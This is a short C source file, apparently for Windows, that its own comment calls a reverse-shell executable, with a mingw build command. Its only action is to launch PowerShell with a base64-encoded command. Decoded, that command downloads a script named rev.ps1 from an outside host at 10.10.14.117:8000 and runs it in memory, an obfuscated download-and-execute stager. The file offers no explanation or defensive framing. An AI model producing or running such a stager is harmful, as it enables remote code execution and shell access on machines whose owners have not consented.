// Compile with: x86_64-w64-mingw32-gcc rev_shell_exe.c -o rev_shell.exe
#include <windows.h>

int main(){
    WinExec("powershell -enc SQBFAFgAKABJAFcAUgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIABoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMQA3ADoAOAAwADAAMAAvAHIAZQB2AC4AcABzADEAKQAKAA==", 1);
}
